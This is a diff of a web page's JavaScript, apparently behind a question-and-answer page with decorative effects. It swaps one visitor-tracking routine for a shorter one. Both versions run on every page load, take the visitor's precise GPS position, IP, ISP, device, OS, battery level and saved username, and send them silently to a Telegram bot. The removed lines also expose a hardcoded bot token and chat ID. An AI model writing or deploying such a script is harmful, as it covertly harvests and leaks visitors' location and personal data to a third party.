@@ -171,90 +171,49 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   }, 1000);
 });
 
-// === INFO PENGUNJUNG GACOR++ (tanpa dedupe, pakai BOT_TOKEN & CHAT_ID dari script lama) ===
-const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
-const CHAT_ID = "6864694275";
-
-async function showVisitorInfoGacorPlus_NoDedupe() {
-  const savedUser = localStorage.getItem("ig_user") || "Seseorang";
-
-  async function reverseGeocode(lat, lon) {
-    try {
-      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
-      const j = await res.json();
-      const addr = j.address || {};
-      const parts = [addr.road, addr.suburb, addr.city, addr.state, addr.country].filter(Boolean);
-      return parts.join(", ");
-    } catch {
-      return null;
-    }
-  }
-
+// === INFO PENGUNJUNG ===
+async function showVisitorInfo() {
+  const savedUser = localStorage.getItem("ig_user") || "Anonim";
   async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
     try {
-      const date = new Date();
-      const ua = navigator.userAgent || "";
-      const device = /mobile/i.test(ua) ? "📱 Mobile" : "🖥️ Desktop";
-      const os = /Windows/i.test(ua) ? "Windows" :
-        /Android/i.test(ua) ? "Android" :
-        /iPhone|iPad|iOS/i.test(ua) ? "iOS" :
-        /Mac/i.test(ua) ? "MacOS" :
-        /Linux/i.test(ua) ? "Linux" : "Unknown";
-      const browser =
-        /WhatsApp/i.test(ua) ? "WhatsApp" :
-        /Chrome/i.test(ua) ? "Chrome" :
-        /Safari/i.test(ua) ? "Safari" :
-        /Firefox/i.test(ua) ? "Firefox" :
-        /Edge/i.test(ua) ? "Edge" :
-        /Opera/i.test(ua) ? "Opera" : "Lainnya";
-
+      const now = new Date();
+      const mapLink = (latitude && longitude)
+        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
+        : "https://www.google.com/maps";
+      const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
+      const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
+        /Android/i.test(navigator.userAgent) ? "Android" :
+        /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
+        /Mac/i.test(navigator.userAgent) ? "MacOS" :
+        /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
       let batteryInfo = "Tidak diketahui";
-      try { 
-        if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
-        }
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
       } catch {}
-
-      const mapLink = (latitude && longitude) ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17` : "https://www.google.com/maps";
-
-      let fullAddress = "";
-      if (latitude && longitude) fullAddress = await reverseGeocode(latitude, longitude);
-
-      const msg = `📢 Pengunjung Baru GACOR++
+      const msg = `📢 Pengunjung Baru!
 👤 ${savedUser}
-🌎 ${fullAddress || `${d.city || "?"}, ${d.country || d.country_name || "?"}`}
+🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
 🗺️ Maps: ${mapLink}
-📍 Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
+📍 Sumber Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
 💻 ${device}
 🧩 OS: ${os}
-🌐 Browser: ${browser}
 🔋 Baterai: ${batteryInfo}
 🏷️ ISP: ${d.connection?.isp || d.org || "?"}
 📡 IP: ${d.ip || "?"}
-🕓 ${date.toLocaleString('id-ID')}`;
-
+🕓 ${now.toLocaleString('id-ID')}`;
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg }),
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
       });
-
-      console.log("✅ Info pengunjung GACOR++ terkirim");
-    } catch (err) {
-      console.error("❌ Gagal kirim info:", err);
-    }
+    } catch (err) { console.error("❌ Gagal kirim info:", err); }
   }
-
   try {
-    const pos = await new Promise((res, rej) =>
-      navigator.geolocation.getCurrentPosition(res, rej, {
-        enableHighAccuracy: true,
-        timeout: 8000,
-        maximumAge: 0,
-      })
-    );
-    const { latitude, longitude, accuracy } = pos.coords;
+    const coords = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
+    });
+    const { latitude, longitude, accuracy } = coords.coords;
     const ipData = await (await fetch("https://ipwho.is/")).json();
     await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
   } catch {
@@ -262,9 +221,7 @@ async function showVisitorInfoGacorPlus_NoDedupe() {
     await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
   }
 }
-
-// Jalankan otomatis setiap load (tanpa pembatasan)
-showVisitorInfoGacorPlus_NoDedupe();
+showVisitorInfo();
 
 // === EFEK BUTTERFLY 💸 ===
 (function () {
